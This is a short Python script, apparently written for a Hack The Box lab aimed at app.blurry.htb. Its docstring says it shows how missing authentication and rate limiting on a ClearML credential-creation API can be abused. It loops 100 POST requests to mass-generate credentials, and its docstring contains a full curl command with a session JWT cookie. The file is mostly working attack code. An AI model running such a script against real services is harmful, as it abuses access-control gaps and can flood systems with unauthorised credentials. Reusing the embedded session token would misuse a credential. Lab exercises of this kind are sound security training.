"""This file is used to demonstrate how the lack of authentication, and rate limiting can be exploited to generate a large quantity of credentials."""
"""It sends post requests to the app.blurry.htb api to generate credentials"""
"""We are emulating `curl 'http://app.blurry.htb/api/v2.27/auth.create_credentials' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: application/json' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://app.blurry.htb/dashboard' -H 'X-Allegro-Client: Webapp-1.13.1-426' -H 'Content-Type: application/json' -H 'Origin: http://app.blurry.htb' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: clearml_token_basic=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoX3R5cGUiOiJCZWFyZXIiLCJpZGVudGl0eSI6eyJjb21wYW55IjoiZDFiZDkyYTNiMDM5NDAwY2JhZmM2MGE3YTViMWU1MmIiLCJ1c2VyIjoiYmRlNjY3ZmJiMDY5NGRlODljNmNlYjg5MjQyZmE5MTQiLCJ1c2VyX25hbWUiOiJjYW0iLCJyb2xlIjoidXNlciIsImNvbXBhbnlfbmFtZSI6ImNsZWFybWwifSwiZW52IjoiPHVua25vd24-IiwiZXhwIjoxNzIzNjQ5MjkzLCJpYXQiOjE3MjEwNTcyOTMsImFwaV92ZXJzaW9uIjoiMi4yNyIsInNlcnZlcl92ZXJzaW9uIjoiMS4xMy4xIiwic2VydmVyX2J1aWxkIjoiNDI2IiwiZmVhdHVyZV9zZXQiOiJiYXNpYyJ9._Wezam9pVlRQnemf8tN_4kKKcsFtSFwyHQCjA6ovTMA' -H 'Priority: u=0' --data-raw '{}'`"""

import random
import string
import time
import sys
import requests
import os
from rich import print


BASE_URL: str = "http://app.blurry.htb"
API_ENDPOINT: str = "/api/v2.27/auth.create_credentials"



def main():

    starting_creds: int = 0

    with requests.Session() as session:
        for cred in range(100):
            print(f"[blue]Generating creds starting at {starting_creds}...[/blue]")
            try:
                credential_response = session.post(BASE_URL + API_ENDPOINT)
                credential_response.raise_for_status()
            except requests.exceptions.RequestException as e:
                print(f"[red]Error generating cred: {e}[/red]")
                continue
            starting_creds += 1
            print(f"[green]Generated creds starting at {starting_creds}[/green]")

            time.sleep(0.5)

        print("[green]Creds generated successfully![/green]")

    
if __name__ == "__main__":
    main()

